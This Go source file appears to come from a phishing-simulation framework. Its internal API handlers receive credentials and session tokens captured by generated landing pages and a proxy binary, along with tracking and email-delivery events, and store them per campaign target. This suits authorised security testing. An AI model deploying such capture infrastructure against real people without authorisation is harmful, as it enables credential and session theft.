package internalapi

import (
	"encoding/json"
	"log/slog"
	"net/http"

	"tackle/internal/middleware"
	"tackle/internal/repositories"
	credsvc "tackle/internal/services/credential"
	emaildeliverysvc "tackle/internal/services/emaildelivery"
	"tackle/pkg/response"
)

// ensure credsvc is used even if CredSvc is nil at runtime.
var _ *credsvc.Service

// SessionDataInput represents a session artifact to be captured.
// This mirrors credsvc.SessionDataInput for the internal API contract.
type SessionDataInput struct {
	DataType        string         `json:"data_type"`
	Key             string         `json:"key"`
	Value           string         `json:"value"`
	Metadata        map[string]any `json:"metadata,omitempty"`
	IsTimeSensitive bool           `json:"is_time_sensitive,omitempty"`
}

// SessionCapturePayload is the expected JSON body for session capture forwarding.
type SessionCapturePayload struct {
	TrackingToken string             `json:"tracking_token"`
	SessionData   []SessionDataInput `json:"session_data"`
}

// CapturePayload is the expected JSON body for credential capture forwarding.
type CapturePayload struct {
	Fields        map[string]any `json:"fields"`
	TrackingToken string         `json:"tracking_token"`
	Metadata      map[string]any `json:"metadata"`
}

// TrackingPayload is the expected JSON body for tracking event forwarding.
type TrackingPayload struct {
	CampaignID    string         `json:"campaign_id"`
	BuildToken    string         `json:"build_token"`
	TrackingToken string         `json:"tracking_token"`
	EventType     string         `json:"event_type"`
	Metadata      map[string]any `json:"metadata"`
}

// TelemetryPayload is the expected JSON body for telemetry forwarding.
type TelemetryPayload struct {
	CampaignID    string         `json:"campaign_id"`
	BuildToken    string         `json:"build_token"`
	TrackingToken string         `json:"tracking_token"`
	Payload       map[string]any `json:"payload"`
}

// resolveTrackingToken resolves a tracking token to campaign, target, and variant IDs.
// Falls back to build info campaign and marks as unattributed if resolution fails.
func (d *Deps) resolveTrackingToken(r *http.Request, token string, buildCampaignID string) (campaignID, targetID, variantID string, isUnattributed bool) {
	if token == "" || d.TokenSvc == nil || d.DB == nil {
		return buildCampaignID, "", "", true
	}

	resolved, err := d.TokenSvc.ResolveToken(r.Context(), d.DB, token)
	if err != nil {
		slog.Warn("resolve tracking token failed", "error", err)
		return buildCampaignID, "", "", true
	}

	if resolved.CampaignID == "" {
		// Token not found in DB — unattributed.
		return buildCampaignID, "", "", true
	}

	return resolved.CampaignID, resolved.TargetID, resolved.VariantID, false
}

// HandleCapture receives captured credentials from generated landing page apps.
func (d *Deps) HandleCapture(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	correlationID := middleware.GetCorrelationID(r.Context())
	buildInfo := middleware.BuildTokenFromContext(r.Context())
	if buildInfo == nil {
		response.Error(w, "UNAUTHORIZED", "missing build token", http.StatusUnauthorized, correlationID)
		return
	}

	var payload CapturePayload
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		response.Error(w, "VALIDATION_ERROR", "invalid JSON payload", http.StatusBadRequest, correlationID)
		return
	}

	// Resolve tracking token to real campaign/target/variant IDs.
	campaignID, targetID, variantID, isUnattributed := d.resolveTrackingToken(r, payload.TrackingToken, buildInfo.CampaignID)

	// Extract endpoint ID from context (set by endpoint auth middleware).
	endpointID := middleware.EndpointAuthFromContext(r.Context())

	// Build event data with captured fields.
	eventData := map[string]any{
		"fields":         payload.Fields,
		"tracking_token": payload.TrackingToken,
		"build_id":       buildInfo.BuildID,
	}
	if payload.Metadata != nil {
		eventData["capture_metadata"] = payload.Metadata
	}
	if isUnattributed {
		eventData["is_unattributed"] = true
	}

	// Use resolved target ID for the event, or a placeholder for unattributed captures.
	eventTargetID := targetID
	if eventTargetID == "" {
		eventTargetID = "unknown"
	}

	// Record in the event stream for timeline tracking.
	_, err := d.EventRepo.RecordEvent(r.Context(), repositories.CampaignTargetEvent{
		CampaignID: campaignID,
		TargetID:   eventTargetID,
		EventType:  "credential_submitted",
		EventData:  eventData,
		IPAddress:  extractMetaStringPtr(payload.Metadata, "ip"),
		UserAgent:  extractMetaStringPtr(payload.Metadata, "user_agent"),
	})
	if err != nil {
		response.Error(w, "INTERNAL_ERROR", "failed to record capture event", http.StatusInternalServerError, correlationID)
		return
	}

	// Store in dedicated credential capture tables with encryption.
	if d.CredSvc != nil {
		fields := make(map[string]string, len(payload.Fields))
		for k, v := range payload.Fields {
			if s, ok := v.(string); ok {
				fields[k] = s
			} else {
				// Convert non-string values to string representation.
				b, _ := json.Marshal(v)
				fields[k] = string(b)
			}
		}

		var tgtIDPtr *string
		if targetID != "" {
			tgtIDPtr = &targetID
		}

		var variantIDPtr *string
		if variantID != "" {
			variantIDPtr = &variantID
		}

		var endpointIDPtr *string
		if endpointID != "" {
			endpointIDPtr = &endpointID
		}

		_, captureErr := d.CredSvc.Capture(r.Context(), credsvc.CaptureInput{
			CampaignID:        campaignID,
			TrackingToken:     payload.TrackingToken,
			TargetID:          tgtIDPtr,
			TemplateVariantID: variantIDPtr,
			EndpointID:        endpointIDPtr,
			Fields:            fields,
			SourceIP:          extractMetaString(payload.Metadata, "ip"),
			UserAgent:         extractMetaString(payload.Metadata, "user_agent"),
			Referer:           extractMetaString(payload.Metadata, "referer"),
			URLPath:           extractMetaString(payload.Metadata, "url_path"),
			HTTPMethod:        "POST",
		})
		// Log but don't fail the response — event stream capture already succeeded.
		if captureErr != nil {
			slog.Warn("credential capture storage failed", "error", captureErr)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

// HandleTracking receives tracking events (page views, link clicks) from generated apps.
func (d *Deps) HandleTracking(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	correlationID := middleware.GetCorrelationID(r.Context())
	buildInfo := middleware.BuildTokenFromContext(r.Context())
	if buildInfo == nil {
		response.Error(w, "UNAUTHORIZED", "missing build token", http.StatusUnauthorized, correlationID)
		return
	}

	var payload TrackingPayload
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		response.Error(w, "VALIDATION_ERROR", "invalid JSON payload", http.StatusBadRequest, correlationID)
		return
	}

	eventType := payload.EventType
	if eventType == "" {
		eventType = "page_view"
	}

	// Resolve tracking token to real campaign/target IDs.
	campaignID, targetID, _, _ := d.resolveTrackingToken(r, payload.TrackingToken, buildInfo.CampaignID)

	eventTargetID := targetID
	if eventTargetID == "" {
		eventTargetID = "unknown"
	}

	eventData := map[string]any{
		"tracking_token": payload.TrackingToken,
		"build_id":       buildInfo.BuildID,
	}
	if payload.Metadata != nil {
		eventData["tracking_metadata"] = payload.Metadata
	}

	_, err := d.EventRepo.RecordEvent(r.Context(), repositories.CampaignTargetEvent{
		CampaignID: campaignID,
		TargetID:   eventTargetID,
		EventType:  eventType,
		EventData:  eventData,
		IPAddress:  extractMetaStringPtr(payload.Metadata, "ip"),
		UserAgent:  extractMetaStringPtr(payload.Metadata, "user_agent"),
	})
	if err != nil {
		response.Error(w, "INTERNAL_ERROR", "failed to record tracking event", http.StatusInternalServerError, correlationID)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

// HandleTelemetry receives JavaScript-collected telemetry data from generated apps.
func (d *Deps) HandleTelemetry(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	correlationID := middleware.GetCorrelationID(r.Context())
	buildInfo := middleware.BuildTokenFromContext(r.Context())
	if buildInfo == nil {
		response.Error(w, "UNAUTHORIZED", "missing build token", http.StatusUnauthorized, correlationID)
		return
	}

	var payload TelemetryPayload
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		response.Error(w, "VALIDATION_ERROR", "invalid JSON payload", http.StatusBadRequest, correlationID)
		return
	}

	// Resolve tracking token to real campaign/target IDs.
	campaignID, targetID, _, _ := d.resolveTrackingToken(r, payload.TrackingToken, buildInfo.CampaignID)

	eventTargetID := targetID
	if eventTargetID == "" {
		eventTargetID = "unknown"
	}

	eventData := map[string]any{
		"tracking_token": payload.TrackingToken,
		"build_id":       buildInfo.BuildID,
		"telemetry":      payload.Payload,
	}

	_, err := d.EventRepo.RecordEvent(r.Context(), repositories.CampaignTargetEvent{
		CampaignID: campaignID,
		TargetID:   eventTargetID,
		EventType:  "telemetry",
		EventData:  eventData,
	})
	if err != nil {
		response.Error(w, "INTERNAL_ERROR", "failed to record telemetry event", http.StatusInternalServerError, correlationID)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

// HandleSessionCapture receives session capture data from the endpoint binary.
// The endpoint binary acts as a transparent proxy, forwarding session data
// from generated landing pages to the framework's internal API.
func (d *Deps) HandleSessionCapture(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	correlationID := middleware.GetCorrelationID(r.Context())
	buildInfo := middleware.BuildTokenFromContext(r.Context())
	if buildInfo == nil {
		response.Error(w, "UNAUTHORIZED", "missing build token", http.StatusUnauthorized, correlationID)
		return
	}

	var payload SessionCapturePayload
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		response.Error(w, "VALIDATION_ERROR", "invalid JSON payload", http.StatusBadRequest, correlationID)
		return
	}

	// Resolve tracking token to real campaign/target/variant IDs.
	campaignID, targetID, variantID, isUnattributed := d.resolveTrackingToken(r, payload.TrackingToken, buildInfo.CampaignID)

	// Extract endpoint ID from context (set by endpoint auth middleware).
	endpointID := middleware.EndpointAuthFromContext(r.Context())

	// Build event data with captured fields for the event stream.
	eventData := map[string]any{
		"session_data":   payload.SessionData,
		"tracking_token": payload.TrackingToken,
		"build_id":       buildInfo.BuildID,
	}
	if isUnattributed {
		eventData["is_unattributed"] = true
	}

	// Use resolved target ID for the event, or a placeholder for unattributed captures.
	eventTargetID := targetID
	if eventTargetID == "" {
		eventTargetID = "unknown"
	}

	// Record in the event stream for timeline tracking.
	_, err := d.EventRepo.RecordEvent(r.Context(), repositories.CampaignTargetEvent{
		CampaignID: campaignID,
		TargetID:   eventTargetID,
		EventType:  "session_capture",
		EventData:  eventData,
	})
	if err != nil {
		response.Error(w, "INTERNAL_ERROR", "failed to record session capture event", http.StatusInternalServerError, correlationID)
		return
	}

	// Store in dedicated credential capture tables with encryption.
	if d.CredSvc != nil {
		// Convert SessionDataInput to credsvc.SessionDataInput
		sessionData := make([]credsvc.SessionDataInput, 0, len(payload.SessionData))
		for _, sd := range payload.SessionData {
			sessionData = append(sessionData, credsvc.SessionDataInput{
				DataType:        repositories.SessionDataType(sd.DataType),
				Key:             sd.Key,
				Value:           sd.Value,
				Metadata:        sd.Metadata,
				IsTimeSensitive: sd.IsTimeSensitive,
			})
		}

		var tgtIDPtr *string
		if targetID != "" {
			tgtIDPtr = &targetID
		}

		var variantIDPtr *string
		if variantID != "" {
			variantIDPtr = &variantID
		}

		var endpointIDPtr *string
		if endpointID != "" {
			endpointIDPtr = &endpointID
		}

		_, captureErr := d.CredSvc.Capture(r.Context(), credsvc.CaptureInput{
			CampaignID:        campaignID,
			TrackingToken:     payload.TrackingToken,
			TargetID:          tgtIDPtr,
			TemplateVariantID: variantIDPtr,
			EndpointID:        endpointIDPtr,
			Fields:            nil, // session captures have no form fields
			SourceIP:          r.RemoteAddr,
			UserAgent:         r.Header.Get("User-Agent"),
			Referer:           r.Header.Get("Referer"),
			URLPath:           r.URL.Path,
			HTTPMethod:        r.Method,
			SessionData:       sessionData,
		})
		// Log but don't fail the response — event stream capture already succeeded.
		if captureErr != nil {
			slog.Warn("session capture storage failed", "error", captureErr)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

// HandleDeliveryResult receives delivery status callbacks from phishing endpoint SMTP relay.
func (d *Deps) HandleDeliveryResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	correlationID := middleware.GetCorrelationID(r.Context())

	if d.EmailDeliverySvc == nil {
		response.Error(w, "INTERNAL_ERROR", "email delivery service not configured", http.StatusInternalServerError, correlationID)
		return
	}

	var result emaildeliverysvc.DeliveryResult
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		response.Error(w, "VALIDATION_ERROR", "invalid JSON payload", http.StatusBadRequest, correlationID)
		return
	}

	if result.EmailID == "" || result.CampaignID == "" || result.Status == "" {
		response.Error(w, "VALIDATION_ERROR", "email_id, campaign_id, and status are required", http.StatusBadRequest, correlationID)
		return
	}

	if err := d.EmailDeliverySvc.ProcessDeliveryResult(r.Context(), result); err != nil {
		response.Error(w, "INTERNAL_ERROR", "failed to process delivery result", http.StatusInternalServerError, correlationID)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(`{"status":"ok"}`))
}

func extractMetaStringPtr(meta map[string]any, key string) *string {
	if meta == nil {
		return nil
	}
	v, ok := meta[key].(string)
	if !ok || v == "" {
		return nil
	}
	return &v
}

func extractMetaString(meta map[string]any, key string) string {
	if meta == nil {
		return ""
	}
	v, _ := meta[key].(string)
	return v
}
